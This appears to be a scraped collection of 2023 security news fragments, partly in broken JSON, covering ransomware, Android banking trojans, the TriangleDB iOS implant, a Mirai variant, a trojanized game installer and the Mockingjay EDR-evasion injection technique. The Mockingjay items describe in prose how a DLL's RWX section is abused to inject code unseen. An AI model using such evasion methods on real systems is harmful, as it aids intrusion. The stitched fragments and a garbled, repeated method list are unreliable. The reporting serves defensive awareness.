and Android will include more powerful features for controlling which sites can access local network resources, and for how long.\"By default, no sites will be granted permission to access localhost resources, so users can give it manually by going to \"brave://settings/content/localhostAccess\" on the desktop or \"Settings > Site settings > Localhost Access\" on Android.Besides this new permission mechanism, Brave will use filter list rules to block scripts and sites that abuse localhost access.Requests to localhost resources from a localhost context will still be allowed to pass through without requiring special permissions."

      "text": " The Akira ransomware operation uses a Linux encryptor to encrypt VMware ESXi virtual machines in double-extortion attacks against companies worldwide.Like other enterprise-targeting ransomware gangs, the threat actors steal data from breached networks and encrypt files to conduct double extortion on victims, demanding payments that reach several million dollars.BleepingComputer's analysis of the Linux encryptor shows it has a project name of 'Esxi_Build_Esxi6,' indicating the threat actors designed it specifically to target VMware ESXi servers.For example, one of the project's source code files is /mnt/d/vcprojects/Esxi_Build_Esxi6/argh.h.Over the past few years, ransomware gangs have increasingly created custom Linux encryptors to encrypt VMware ESXi servers as the enterprise moved to use virtual machines for servers for improved device management and efficient use of resources.By targeting ESXi servers, a threat actor can encrypt many servers running as virtual machines in a single run of the ransomware encryptor.However, unlike other VMware ESXi encryptors analyzed by BleepingComputer, Akira's encryptors do not contain many advanced features, such as the automatic shutting down of virtual machines before encrypting files using the esxcli command.With that said, the binary does support a few command line arguments that allow an attacker to customize their attacks:The -n parameter is particularly notable as it allows attackers to define how much data is encrypted on each file.When encrypting files, the Linux Akira encryptor will target the following extensions:Strangely, the Linux locker appears to skip the following folders and files, all related to Windows folders and executables, indicating that the Linux variant of Akira was ported from the Windows version.The symmetric key is used to encrypt the victims' files and is then encrypted with the RSA public key. This prevents access to the decryption key unless you have the RSA private decryption key only held by the attackers.Encrypted files with be renamed to have the .akira extension, and a hardcoded ransom note named akira_readme.txt will be created in each folder on the encrypted device.The expansion of Akira's targeting scope is reflected in the number of victims announced by the group recently, which only makes the threat more severe for organizations worldwide."

      "title": "EncroChat dismantling led to 6,558 arrests and the seizure of $979M in criminal funds",
      "text": " In July 2020, a joint operation conducted by European and British law enforcement agencies resulted in the arrest of hundreds of alleged drug dealers and other crooks. The police infiltrated the global network of the encrypted chatting app that was used by criminals involved in drug dealing, money laundering, extortions, and even murders.Since 2017, the police have launched an investigation into phones that were used by criminals to secure their communications. The investigators discovered that the phones were running the EncroChat application, software provided by a company operating from servers in France.Europol said that in early 2020, EncroChat was one of the largest providers of encrypted digital communication, one of the most popular in the criminal ecosystem. The handset and the services are offered for around £1,500 for a six-month subscription, it had 60,000 users worldwide.French authorities opened a case at the EU Agency for Criminal Justice Cooperation (Eurojust), towards the Netherlands in 2019EncroChat phones are used to securely exchange data and messages with pre-loaded apps for secure instant messaging, VOIP calling. The application includes self-destruct messages and a ‘remote wipe’ feature to remotely wipe data on the handset in case of emergency.French and Dutch police hacked into the network and analyzed millions of messages and hundreds of thousands of images in real-time.Law enforcement agencies claimed to have cracked the encryption code of EncroChat in March and started penetrating the network from April 1, 2020. EncroChat discovered the hack on June 13 and urged its users to throw away their devices due to the ongoing operation conducted by the police.European authorities successfully dismantled Encrochat and disrupted one of the key communication networks used by criminal organizations in Europe.According to the press release published by Europol, since the dismantling, law enforcement intercepted, shared and analyzed over 115 million criminal conversations, involving over 60 000 users.  “The information obtained by the French and Dutch authorities was shared with their counterparts in EU Member States and third countries, at their request. Based on accumulated figures from all authorities involved, this led to the following results, three years after the encryption was broken by law enforcement:EncroChat was selling crypto phones for around EUR 1 000 each, it was also offering subscriptions with worldwide coverage, at a cost of 1 500 EUR for a six-month period, with 24/7 support.The police claimed to have compromised the Sky ECC network and eavesdropped on suspects’ communications.According to the indictment, Sky Global employees allowed their customers to pay using digital currencies (i.e. Bitcoin) to anonimize the illegal transactions, protecting customers’ anonymity.\nCopyright@securityaffairs 2023 "

The research aimed at using electromagnetic (EM) side-channel attacks or EM fault injection (EMFI) to reach the goal. The researchers tested the attacks against one of the most popular quadcopter drones, DJI’s Mavic Pro. In a first attack scenario tested by IOActive, the researchers attempted to retrieve the encryption key using EM emanations and decrypting the firmware. However, the tests revealed that the probability of a successful signature bypass was less than 0.5%.The researchers set up a test environment that included a laptop (used as a controller), a power supply, Riscure’s Spider (used to generate the trigger), an oscilloscope, an XYZ table, and the EMFI pulse-generator.“Having successfully caused memory corruption, the next step would be to design a proper payload that achieves code execution. An attacker could use such an exploit to fully control one device, leak all sensitive content, enable ADB access, and potentially leak the encryption keys.” added the company.IOActive shared their findings with the DJI team on 2023-04-04 which quickly offered their support and agreed on a publication date on 2023-05-04.\nCopyright@securityaffairs 2023 "

      "text": " Deputy Editor, Infosecurity MagazineRecorded Future said that recent geopolitical developments, including the Russia-Ukraine conflict, China’s coercive actions towards Taiwan and growing tensions between the US and China, “will very likely be key drivers of the near-term risk environment.”The researchers believe these cables will be targets for sabotage and even espionage attacks amid escalating tensions between nation-states. For example, the report highlighted that two submarine cables connecting Taiwan with the outlying island of Matsu were cut by Chinese civilian ships, likely intentionally, within six days of each other in February 2023.Disruptions to these cables by adversaries can have severe economic and societal consequences for nations.In addition to the severing of the cables underwater, Terron observed that remote network management systems are being used to operate the cables, which “opens up avenues to be potentially targeted by cyber threat actors.”The report noted that these systems almost always require connection to the internet, meaning that “third-party vulnerabilities become more likely to jeopardize the security and resilience of the entire cable system.”Terron added that these networks are using systems like Linux and Windows, which “actors are already exploiting.”Few other details were released about the incident, which Terron believes is a deliberate approach by authorities to “not give anyone any ideas.”He also believes it is likely that similar attacks have occurred in other areas, but the information has not been shared by the relevant authorities.The report argued that state-sponsored and hacktivist groups are more likely to carry out cyber-attacks on submarine cables than financially-motivated cyber-criminals – to cause disruption and sabotage.Successful attacks on submarine cables could also cause knock-on data issues, according to Terron. He said that organizations using cloud hosting services with data centers based in locations where the internet is cut off, will “get resulting disruptions and impact their access to their own digital assets.”Another issue relating to these cables is espionage. The report outlined the growing role of Chinese state-owned enterprises as cable owners and providers, which is “increasing China’s ability to manipulate, surveil and interfere with worldwide data flows.”Terron told Infosecurity: “There’s been multiple governments warning against Chinese involvement in these submarine cable systems because of potential hacking capabilities – somebody could potentially obtain information through those information superhighways.”He said that organizations and governments should encrypt their communications to mitigate against this risk."

      "text": " A new process injection technique named 'Mockingjay' could allow threat actors to bypass EDR (Endpoint Detection and Response) and other security products to stealthily execute malicious code on compromised systems.Process injection is a method of executing arbitrary code in the address space of another running process that is trusted by the operating system, hence giving threat actors the ability to run malicious code without being detected.Examples of process injection techniques include DLL injection, PE (portable executable) injection, reflective DLL injection, thread execution hijacking, process hollowing, mapping injection, APC (asynchronous procedure call) injection, and others.In all these techniques, the attackers must use Windows APIs and various system calls, create processes/threads, write process memory, etc. Hence, security tools monitoring for specific actions relating to the above can detect suspicious incidents and intervene as required.Security Joes says that Mockingjay stands out from other approaches because it does not use commonly abused Windows API calls, set special permissions, perform memory allocation, or even start a thread, hence eliminating many possible detection opportunities.The researchers' first goal was to find a vulnerable DLL with a default RWX section, so they could modify its contents to load malicious code without performing extra steps like gaining additional permissions, which could raise red flags on security software.In their quest for a suitable DLL, the Security Joes analysts discovered the DLL msys-2.0.dll inside Visual Studio 2022 Community, which had a default RWX section of 16 KB in size.\"By leveraging this pre-existing RWX section, we can take advantage of the inherent memory protections it offers, effectively bypassing any functions that may have already been hooked by EDRs,\" reads the report\"This approach not only circumvents the limitations imposed by userland hooks but also establishes a robust and reliable environment for our injection technique.\"Next, the team developed two injection methods, one for self-injection and one for remote process injection.In the first case, a custom application (\"nightmare.exe\") loads the vulnerable DLL directly into its memory space using two Windows API calls, granting it direct access to the RWX section without performing memory allocation or setting the permissions.Next, a clean system module, NTDLL.DLL, is abused for extracting syscall numbers which are then used to bypass EDR hooks using the \"Hell's Gate EDR unhooking\" technique, letting the injected shellcode run without getting detected.The second method involves exploiting the TWX section of msys-2.0.dll to inject a payload into a remote process, specifically the \"ssh.exe\" process.The custom application launches ssh.exe as a child process, opens a handle to the target process, and injects the malicious code onto the RWX memory space of the vulnerable DLL.Finally, the injected shellcode loads the \"MyLibrary.dll\" DLL file, establishing a reverse shell with the attacker's machine as an attack example.Tests showed that this remote injection attack, which doesn't require creating a new thread within the target process, allocating memory, or setting permissions, successfully evades EDR solutions.Both methods proposed in Mockingjay use Windows APIs such as 'LoadLibraryW,' 'CreateProcessW,' and 'GetModuleInformation' to load a misconfigured DLL and find the address of the DLL's RWX section.However, EDRs commonly monitor APIs such as 'WriteProcessMemory,' 'NtWriteVirtualMemory,' 'CreateRemoteThread,' or 'NtCreateThreadEx,' which are more commonly invoked in traditional process injection attacks. Hence, Mockingjay is less likely to raise alarms.The development of 'Mockingjay' by Joes Security is another indication of why organizations must adopt a holistic security approach instead of solely relying on current EDR solutions."

      "text": " A new process injection technique dubbed Mockingjay can be exploited by attackers to bypass security controls and gain unauthorized access to compromised systems.The term process injection is used to refer to a method used to inject malicious code into the memory space of a process.To detect project injection, EDR (Endpoint Detection and Response) software often sets hooks on Windows APIs within the memory space of every launched process. The security solutions use hooks to intercept and capture the parameters passed to the Windows APIs.Security Joes researchers Thiago Peixoto, Felipe Duarte, and Ido Naor demonstrated that misusing trusted Windows libraries that already contain sections with default protections set as RWX (Read-Write-Execute) it is possible to inject code into various processes without executing several Windows APIs.The researchers conducted the study in two distinct stages:The researchers discovered that the DLL msys-2.0.dll possesses a default RWX section that could potentially be exploited by an attacker to load malicious code. “With a generous 16 KB of available RWX space, this DLL presents an ideal location for injecting and executing our code. By leveraging this pre-existing RWX section, we can take advantage of the inherent memory protections it offers, effectively bypassing any functions that may have already been hooked by EDRs.” continues the report. “This approach not only circumvents the limitations imposed by userland hooks but also establishes a robust and reliable environment for our injection technique.”Once identified the vulnerable DLL the researchers analyzed self-injection and remote process injection techniques to bypass security measures.In the first technique, attackers directly load the vulnerable DLL into the memory space of their custom application. The attackers gain direct access to the default RWX section and execute arbitrary code without additional memory allocation or permission setting.In the second technique, the attackers leverage the RWX section in the vulnerable DLL to perform process injection in a remote process. The remote process injection uses the RWX section in the vulnerable DLL to perform process injection in a remote process such as ssh.exe.“For our proof of concept, we specifically chose the ssh.exe process located in the Visual Studio directory to inject our payload. It is important to note that in this injection method, there is no need to explicitly create a thread within the target process, as the process automatically executes the injected code. This inherent behavior makes it challenging for Endpoint Detection and Response (EDR) systems to detect this method.” continues the report.Below is the process used by the researchers to bypass EDR detection:The researchers released the following video PoC for their Mockingjay:“This research has provided valuable insights into the utilization of legitimate DLLs with Read-Write-Execute (RWX) sections as an effective method for evading userland hooks and injecting code into remote processes. By leveraging trusted libraries with these attributes, threat actors can bypass the need to allocate RWX memory, set permissions, or even create new threads in the target process.” concludes the report.\nCopyright@securityaffairs 2023 "

It is imperative that security teams and risk managers understand where all their software and dependencies originate from.”In their advisory, the Aqua team demonstrated different exploitation scenarios, including automated downloads, manual downloads and code execution via repository releases. It also includes real-life examples of vulnerable repositories.To compile their research, the security firm utilized the GHTorrent project’s database, which records public events on GitHub, including commit and pull requests. Analyzing a sample dataset, they identified over 36,000 vulnerable repositories out of 1.25 million samples. Extrapolating this data to the entire GitHub repository base, it is estimated that there are potentially millions of vulnerable repositories.According to the executive, GitHub repositories pose a risk of remote execution or the installation of backdoors. It is important to note that this risk extends to other resources as well, including email addresses and domain names, which nation-state actors have already exploited.“Secure de-provisioning is something we are not really considering as we move more to cloud resources and open source, and it will continue to bite us harder until we start dealing with it,” Bambenek concluded."

      "text": " PindOS is a simple JavaScript malware dropper that appears to be built specifically to fetch the next-stage payloads that deliver the attackers’ final payload.The JavaScript dropper comes in obfuscated form but once decoded, it reveals how “surprisingly simple” it is.Its configuration includes the option to define a user agent to download a DLL payload, two URLs where the payload is stored (“URL1“ and “URL2“), and the RunDLL parameter for the payload DLL exported function to call.The researchers note that the second URL parameter is a redundancy that PindOS uses when it cannot retrieve the payload from the first URL, and then tries to execute it by combining PowerShell commands and Microsoft’s rundll.exe, which adversaries use frequently to launch malicious code.PindOS downloads the payload to “%appdata%/Microsoft/Templates/” as a DAT file with six random numbers as a name.Malware samples are generated “on-demand,” the researchers say, so each of them has a different hash when retrieved. This is a common tactic to avoid signature-based detection mechanisms.Despite its simplicity, PindOS enjoyed very low detection rates when it first appeared. On May 20, less than five antivirus engines on Virus Total flagged the JavaScript as malicious.Although most of the samples that DeepInstinct discovered are now detected by at least two dozen products on Virus Total, some of them continue to be invisible to most engines, with as few as six to 14 of them reporting the malicious code.At the moment it is unclear if threat actors are just testing how PindOS fares against security products or if they plan to include it in their toolkit."

      "text": " A new mobile malware campaign since March 2023 pushes the Android banking trojan 'Anatsa' to online banking customers in the U.S., the U.K., Germany, Austria, and Switzerland.In March 2023, after a six-month hiatus in malware distribution, the threat actors launched a new malvertizing campaign that leads prospective victims to download Anatsa dropper apps from Google Play.The malicious apps continue to belong to the office/productivity category, posing as PDF viewer and editor apps and office suites.Whenever ThreatFabric reported the malicious app to Google and it was removed from the store, the attackers returned quickly by uploading a new dropper under a new guise.In all five cases of the identified malware droppers, the apps were submitted onto Google Play in clean form and were later updated with malicious code, likely to evade Google's stringent code review process on the first submission.Once installed on the victim's device, the dropper apps request an external resource hosted on GitHub, from where they download the Anatsa payloads masqueraded as text recognizer add-ons for Adobe Illustrator.Anatsa collects financial information such as bank account credentials, credit card details, payment information, etc., by overlaying phishing pages on the foreground when the user attempts to launch their legitimate bank app and also via keylogging.In its current version, the Anatsa trojan supports targeting nearly 600 financial apps of banking institutions from around the world.Anatsa uses the stolen information to perform on-device fraud by launching the banking app and performing transactions on the victim's behalf, automating the money-stealing process for its operators.\"Since transactions are initiated from the same device that targeted bank customers regularly use, it has been reported that it is very challenging for banking anti-fraud systems to detect it,\" explains ThreatFabric.The stolen amounts are converted to cryptocurrency and passed through an extensive network of money mules in the targeted countries, who will keep a portion of the stolen funds as a revenue share and send the rest to the attackers.As malware campaigns, such as Anatsa, expand their targeting to other countries, users must be extra vigilant about the apps they install on Android devices.Users should avoid installing apps from dubious publishers, even if those are on a well-vetted store like Google Play. Always check the reviews and see if a pattern of reports indicates malicious behavior.Furthermore, if possible, avoid apps with few installs and reviews and instead install apps that are well-known and commonly cited on websites.BleepingComputer asked Google to explain how Anatsa's operators can submit malicious updates on their dropper apps on the Play Store and replace the reported droppers quickly, but a comment wasn't available by publication.Update 6/27 - A Google spokesperson has sent BleepingComputer the following comment:All of these identified malicious apps have been removed from Google Play and the developers have been banned.Google Play Protect also protects users by automatically removing apps known to contain this malware on Android devices with Google Play Services."

      "text": " Microsoft is expanding support for passkeys in Windows 11 to make it more secure to log into websites and apps using biometric authentication.Passkeys are unique codes linked to specific devices such as computers, tablets, or smartphones. Using passkeys significantly reduces the risk of data breaches as they provide protection against phishing attacks that cannot steal them and gain unauthorized access.Passkeys offer a more secure and convenient alternative to passwords as they allow using personal identification numbers (PINs) or biometric authentication like fingerprints or facial recognition to log in to websites and applications.This eliminates the need to remember and manage multiple passwords, enhancing overall security and user experience.\"Once a passkey is created, users can use Windows Hello (face, fingerprint, PIN) to sign in. In addition, users can use their phone to complete the application logon process.\"To use passkeys on your Windows device for website sign-ins, you have to go to passkey-enabled websites like bestbuy.com, ebay.com, or google.com, create a passkey by accessing from your account settings, and then sign out of your account and then sign back in using your newly created passkey.You can also manage your passkeys with the help of a new passkey management dialog integrated into the Windows settings by going to Settings > Accounts > Passkeys.You will see all passkeys saved on the Windows device, and you can search for and delete the ones you no longer use.​When testing the feature, BleepingComputer could use Windows 11 passkeys with Best Buy and Microsoft accounts when attempting to log in.However, while Google allowed for the creation of a passkey, it never prompted us to log in with a passkey when trying to sign into a Google account.This has now become the standard approach for accessing accounts without requiring traditional passwords across platforms controlled by the three tech giants.\"Passkeys will allow you to replace passwords when you sign into a web site or application that supports them,\" Langowski and LeBlanc said.\"Passkeys represent a future where bad actors will have a much harder time stealing and using your credentials when signing into a web site or application. Passkeys are phish-resistant, recoverable, and faster for users.\""

      "text": " Solutions for:ThreatsCategories21 Jun 2023\n  minute read\t\t\t\t\t\t\t\tTable of ContentsAuthorsIn researching Operation Triangulation, we set ourselves the goal to retrieve as many parts of the exploitation chain as possible. It took about half a year to accomplish that goal, and, after the collection of the chain had been completed, we started an in-depth analysis of the discovered stages. As of now, we have finished analyzing the spyware implant and are ready to share the details.The Operation Triangulation infection chainThe implant, which we dubbed TriangleDB, is deployed after the attackers obtain root privileges on the target iOS device by exploiting a kernel vulnerability. It is deployed in memory, meaning that all traces of the implant are lost when the device gets rebooted. Therefore, if the victim reboots their device, the attackers have to reinfect it by sending an iMessage with a malicious attachment, thus launching the whole exploitation chain again. In case no reboot occurs, the implant uninstalls itself after 30 days, unless this period is extended by the attackers.The TriangleDB implant is coded using Objective-C, a programming language that preserves names of members and methods assigned by the developer. In the implant’s binary, method names are not obfuscated; however, names of class members are uninformative acronyms, which makes it difficult to guess their meaning:Class method examplesClass member examples-[CRConfig populateWithFieldsMacOSOnly]\n-[CRConfig populateWithSysInfo]\n-[CRConfig extendFor:]\n-[CRConfig getCInfoForDump]\n+[CRConfig sharedInstance]\n+[CRConfig unmungeHexString:]\n-[CRConfig init]\n-[CRConfig getBuildArchitecture]\n-[CRConfig cLS]\n-[CRConfig setVersion]\n-[CRConfig swapLpServerType]\n-[CRConfig setLpServerType:]\n-[CRConfig populateWithSysInfo]\n-[CRConfig extendFor:]\n-[CRConfig getCInfoForDump]\n+[CRConfig sharedInstance]\n+[CRConfig unmungeHexString:]\n-[CRConfig init]\n-[CRConfig getBuildArchitecture]\n-[CRConfig cLS]\n-[CRConfig setVersion]\n-[CRConfig swapLpServerType]\n-[CRConfig setLpServerType:]\n-[CRConfig extendFor:]\n-[CRConfig getCInfoForDump]\n+[CRConfig sharedInstance]\n+[CRConfig unmungeHexString:]\n-[CRConfig init]\n-[CRConfig getBuildArchitecture]\n-[CRConfig cLS]\n-[CRConfig setVersion]\n-[CRConfig swapLpServerType]\n-[CRConfig setLpServerType:]\n-[CRConfig getCInfoForDump]\n+[CRConfig sharedInstance]\n+[CRConfig unmungeHexString:]\n-[CRConfig init]\n-[CRConfig getBuildArchitecture]\n-[CRConfig cLS]\n-[CRConfig setVersion]\n-[CRConfig swapLpServerType]\n-[CRConfig setLpServerType:]\n+[CRConfig sharedInstance]\n+[CRConfig unmungeHexString:]\n-[CRConfig init]\n-[CRConfig getBuildArchitecture]\n-[CRConfig cLS]\n-[CRConfig setVersion]\n-[CRConfig swapLpServerType]\n-[CRConfig setLpServerType:]\n+[CRConfig unmungeHexString:]\n-[CRConfig init]\n-[CRConfig getBuildArchitecture]\n-[CRConfig cLS]\n-[CRConfig setVersion]\n-[CRConfig swapLpServerType]\n-[CRConfig setLpServerType:]\n-[CRConfig init]\n-[CRConfig getBuildArchitecture]\n-[CRConfig cLS]\n-[CRConfig setVersion]\n-[CRConfig swapLpServerType]\n-[CRConfig setLpServerType:]\n-[CRConfig getBuildArchitecture]\n-[CRConfig cLS]\n-[CRConfig setVersion]\n-[CRConfig swapLpServerType]\n-[CRConfig setLpServerType:]\n-[CRConfig cLS]\n-[CRConfig setVersion]\n-[CRConfig swapLpServerType]\n-[CRConfig setLpServerType:]\n-[CRConfig setVersion]\n-[CRConfig swapLpServerType]\n-[CRConfig setLpServerType:]\n-[CRConfig swapLpServerType]\n-[CRConfig setLpServerType:]\n-[CRConfig setLpServerType:]\nNSString *pubKI;NSData *pubK;signed __int64 iDa;signed __int64 uD;NSString *deN;NSSTring *prT;NSString *seN;NSString *uDI;NSString *iME;NSString *meI;NSString *osV;CRPwrInfo *pwI;In some cases, it is possible to guess what the acronyms mean. For example, osV is the iOS version, and iME contains the device’s IMEI.The strings in the implant are HEX-encoded and encrypted with rolling XOR:The rolling XOR algorithm implemented in the implant for string decryptionOnce the implant launches, it starts communicating with the C2 server, using the Protobuf library for exchanging data. The configuration of the implant contains two servers: the primary and the fallback (contained in the lS and lSf configuration fields). Normally, the implant uses the primary server, and, in case of an error, it switches to the fallback server by invoking the -[CRConfig swapLpServerType:] method.Additionally, the sent and received messages are encrypted with symmetric (3DES) and asymmetric (RSA) cryptography. All messages are exchanged via the HTTPS protocol in POST requests, with the cookie having the key g and a value that is a digit string from the pubKI configuration parameter.Heartbeat beacon snippet, implant v1.7.0.5 running on iOS 15.3.1The C2 server responds to heartbeat messages with commands. Commands are transferred as Protobuf messages that have type names starting with CRX. The meaning of these names is obscure: for example, the command listing directories is called CRXShowTables, and changing C2 server addresses is handled by the command CRXConfigureDBServer. In total, the implant we analyzed has 24 commands designed for:The parameters of this command are as follows:Below, we describe the implant’s commands, specifying the developer-assigned command names along with their numerical identifiers when possible.While researching the TriangleDB implant, we found a lot of curious details:That’s it for TriangleDB, a sophisticated implant for iOS containing multiple oddities.

The list of targeted devices includes routers, DVRs, access control systems, and Solar power generation monitoring systems.The researchers observed two campaigns, respectively in March and June. Since the beginning of the attacks observed in October 2022, threat actors have enhanced the botnet by integrating exploits for new vulnerabilities.The attack chain commences with the exploitation of one of the above issues, then the threat actor tries to download a shell script downloader from a remote server.Upon executing the script, it would download and execute the proper bot clients for the specific Linux architectures:Once executed the bot client, the shell script downloader will delete the client executable file to avoid detection.The researchers pointed out that the Mirai variant like IZ1H9 and V3G4 will first initialize an encrypted string table and then retrieve the strings through an index. However, this Mirai variant will directly access the encrypted strings in the .rodata section via an indexThe approach allows the malware to remain under the radar and be faster.This Mirai variant lack of brute forcing login credentials capability, which means that operators have to manually deploy it by exploiting the above vulnerabilities.“The widespread adoption of IoT devices has become a ubiquitous trend. However, the persistent security concerns surrounding these devices cannot be ignored. The Mirai botnet, discovered back in 2016, is still active today. A significant part of the reason for its popularity among threat actors lies in the security flaws of IoT devices.” concludes the report. “These remote code execution vulnerabilities targeting IoT devices exhibit a combination of low complexity and high impact, making them an irresistible target for threat actors.

      "text": " The samples were clearly a work in progress, Kaspersky noted, since \"for instance, the macOS sample was unsigned, so it could not be executed as is. Also, the string encryption method was simple: one-byte XOR.\"Should they eventually make it to the wild, however, these new ransomware variants could prove useful to LockBit as it tries to stay relevant, says Jason Baker, threat intelligence analyst at GuidePoint Security. \"In an increasingly crowded RaaS marketplace competing for talent and targets, this kind of differentiating behavior may ultimately benefit LockBit despite the additional costs and lower volume of targets.\"Perhaps, in retrospect, it was dedicating extra time and resources to developing its new malware. Or, perhaps, the new malware is a response to its decline.\"We're seeing increased reporting lately related to embedded devices being used for persistence,\" reports Adam Pennington, project leader for MITRE, though major attacks have not yet been demonstrated in the wild.LockBit will face hurdles in breaking through this glass ceiling, explains Callie Guenther, cyber threat research senior manager at Critical Start. \"Unlike traditional operating systems, embedded systems and IoT devices often have resource constraints, limited processing power, and specific hardware configurations. Ransomware designed for SoCs needs to be tailored to these limitations and adapted to the specialized environment,\" she points out.\"Furthermore,\" she continues, \"SoCs often run specialized firmware or customized operating systems, which may require a different approach in terms of payload delivery, execution, and evasion techniques. Ransomware targeting SoCs may need to exploit specific vulnerabilities or weaknesses within the firmware or system architecture to gain control over the device and encrypt its data.\"Baker speculates that the challenge may be part of the appeal for LockBit. \"The most likely reason to target SoCs that are not being targeted by other groups, such as Apple silicon, is for the sake of brand strength and prestige. Larger, more advanced groups such as LockBit have the in-house expertise and resources to throw at this problem set, and developing a unique capability not available elsewhere would continue to highlight the group as a pioneer in the ransomware-as-a-service (RaaS) ecosystem,\" he says.The reason to worry about ransomware for embedded technologies, Pennington explains, isn't merely that it's new and uncharted. It's also that these technologies are easier to overlook and sometimes harder to protect.\"Most enterprises heavily focus their security efforts on Windows, despite various other server and embedded operating systems occupying the exact same networks. Among other reasons, targeting these alternate platforms can be a really effective way to evade existing defenses,\" Pennington assesses.He poses a scenario where \"a ransomware or other actor infects a network, defenders clean up the type of systems where they have visibility and tools to see and manage systems, and then they discover months later that an implant has been left behind on something like a Linux-based security camera running on one of these other architectures.\"To prevent attackers gaining this upper hand, Pennington says, \"organizations need to consider a diverse set of operating systems and architectures when they secure themselves, and not just their Windows systems.\"\"Nearly everyone is running some number of systems with these types of OSs and chips,\" he emphasizes, \"even if they don't realize it.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

Republican Rep. Jay Obernolte of California said addressing cyber threats is essential to the country’s economic competitiveness as well as national security. He added that China will likely produce twice as many computer science students with doctoral degrees this year than the United States.\n“We need to incentivize students to pursue careers in fields like cybersecurity to reverse that trend,” he said. “We must all embrace the idea of becoming lifelong learners.”Advertisement. Scroll to continue reading.\n\n\nRep. Joaquin Castro of Texas said Google’s initiative helps democratize cybersecurity, providing more employment opportunities and more protection to those not located in Silicon Valley.\n“Small businesses literally can lose hundreds of thousands of dollars every year,” Castro said. “I’m grateful to Google for building on their commitment to support the growth of a workforce necessary to do everything from securing critical infrastructure in local communities to bolstering our national security.”\nPichai said there are currently more than 650,000 open cybersecurity jobs and there is a need for a diverse workforce to address the issue. “We have seen this in the past when we’ve gone to communities and open data centers in rural communities,” he said. “It creates a spark.

The threat actors bundled a legitimate installer file of super-mario-forever-v702e with the malicious codes. The researchers pointed out that attackers target gamers because they often use powerful hardware for gaming, which is excellent for mining cryptocurrencies.Mario Forever is a clone of the original Super Mario that attempts to recreate the classic Nintendo game very faithfully.The threat actors tampered with the NSIS installer file “Super-Mario-Bros.exe,” the resulting executable file includes three separate executables: “super-mario-forever-v702e.exe,” which is the legitimate Super Mario game application, along with the malicious executables named “java.exe” and “atom.exe,” as shown below.Upon executing the “Super-Mario-Bros.exe” file, it drops the “super-mario-forever-v702e.exe” executable in the %appdata% directory and executes it. While executing the file, an Installation Wizard is displayed to proceed with the installation of the “super-mario-forever-v7.02” program.Once the software is successfully installed, a user interface is launched to play the Super Mario Forever game. However, an XMR (Monero) miner and a SupremeBot mining client are executed in the background.Upon executing SupremeBot (“atom.exe”), it creates a duplicate of itself and places the copy in a hidden folder in the installation directory of the game.Then “atom.exe” initiates the execution of a scheduled task command that creates a new scheduled task entry that runs every 15 minutes without an end date.Then the executable terminates the “atom.exe” process and removes its associated file from the system. Once deleted, the dropped file establishes a connection to the C&C server and sends it systems information, registers the client, and receives the configuration for the Monero miner.The malware allows:“The expansive and interconnected user base within the gaming community serves as an appealing target for TAs aiming to exploit vulnerabilities and carry out various malicious activities.” concludes the report. “This coin-miner malware campaign leverages the Super Mario Forever game to target gamers and individuals utilizing high-performance computing machines for gaming purposes. Furthermore, the malware also deploys a stealer component to illicitly acquire sensitive information from the victims’ systems, aiming to generate additional financial profits. The combination of mining and stealing activities leads to financial losses, a substantial decline in the victim’s system performance, and the depletion of valuable system resources.”\nCopyright@securityaffairs 2023 "

The modified OpenSSH version mimicked a legitimate server, making detection more challenging.Furthermore, the backdoor deploys open-source rootkits, such as Diamorphine and Reptile, to hide its presence on the compromised systems. It also established communication with a remote command and control server via an IRC bot called ZiggyStarTux. This enabled the threat actors to issue commands and launch distributed denial of service (DDoS) attacks.These include ensuring secure configurations for internet-facing devices, maintaining up-to-date firmware and patches, using secure VPN services for remote access and adopting comprehensive IoT security solutions."

An employee, who had participated in a conference in Asia, reportedly shared his presentation with a colleague using his USB drive, which was consequently infected.Upon the employee’s return to the healthcare institution in Europe, the infected USB drive introduced the malware, leading to the spread of the infection to the hospital’s computer systems.One of the malware’s main variants, WispRider, is particularly potent. It can spread through USB drives using the HopperTick launcher and has additional features, such as a bypass mechanism for SmadAV, a popular antivirus software in Southeast Asia. The malware also employs DLL-sideloading, using components from security software and two major gaming companies for evasion purposes.“The consequences of a successful infection are twofold: the malware not only establishes a backdoor on the compromised machine but also spreads itself to newly connected removable drives,” CPR warned.“This approach not only enables the infiltration of potentially isolated systems but also grants and maintains access to a vast array of entities, even those that are not primarily targeted.”"

      "text": " The US National Security Agency (NSA) is urging systems administrators to go beyond patching in order to protect Windows 10 and 11 machines from the BlackLotus bootkit malware.But the country's top technology intelligence division warned that applying the available Windows 10 and Windows 11 patches is only a \"a good first step.\"That means that bad actors can simply replace fully patched boot loaders with legitimate but vulnerable versions in order to execute BlackLotus on compromised endpoints. It's an issue that Microsoft is addressing with a more comprehensive fix planned for release in early 2024, but until then, the NSA recommends that infrastructure owners take additional steps to harden their systems, such as tightening up user executable policies, and monitoring the integrity of the boot partition. An optional advanced mitigation is to customize the Secure Boot policy by adding DBX records to all Windows endpoints.\"Protecting systems against BlackLotus is not a simple fix,\" said NSA platform security analyst Zachary Blum, in the advisory.And indeed, the advisory offers extensive hardening advice, but fully implementing the NSA's guidance is a process unto itself, notes John Gallagher, vice president of Viakoo Labs.\"Given the manual nature of NSA's guidance, many organizations will find that they don't have the resources needed to fully remediate this vulnerability. Additional measures like use of network access control and traffic analysis should also be used until Microsoft can provide a more complete fix,\" he says.Executing malware like BlackLotus does offer cyberattackers several significant advantages, including ensuring persistence even after OS reinstalls and hard drive replacements. And, because the bad code executes in kernel mode ahead of security software, it's undetectable by standard defenses like BitLocker and Windows Defender (and can indeed turn them off entirely). It also can control and subvert every other program on the machine and can load additional stealthy malware that will execute with root privileges.\"UEFI vulnerabilities, as the guidance from NSA shows, are particularly difficult to mitigate and remediate because they are in the earliest stage of software and hardware interactions,\" says Gallagher. \"The guidance NSA is providing is critically important as a reminder to pay attention to boot-level vulnerabilities and have a method to address them.\"It all sounds pretty dire — an assessment of which many systems administrators agree. But as the NSA noted, most security teams are confused about how to combat the danger that the bootkit poses.\"Some organizations use terms like 'unstoppable,' 'unkillable,' and 'unpatchable' to describe the threat,\" according to the NSA guidance. \"Other organizations believe there is no threat, due to patches that Microsoft released in January 2022 and early 2023 for supported versions of Windows. The risk exists somewhere between both extremes.\"The NSA didn't provide an explanation for why it's issuing the guidance now — i.e., it didn't issue information about recent mass exploitation efforts or in-the-wild incidents. But John Bambenek, principal threat hunter at Netenrich, notes that the NSA piping up at all should indicate that BlackLotus is a threat that requires attention.\"Whenever the NSA releases a tool or 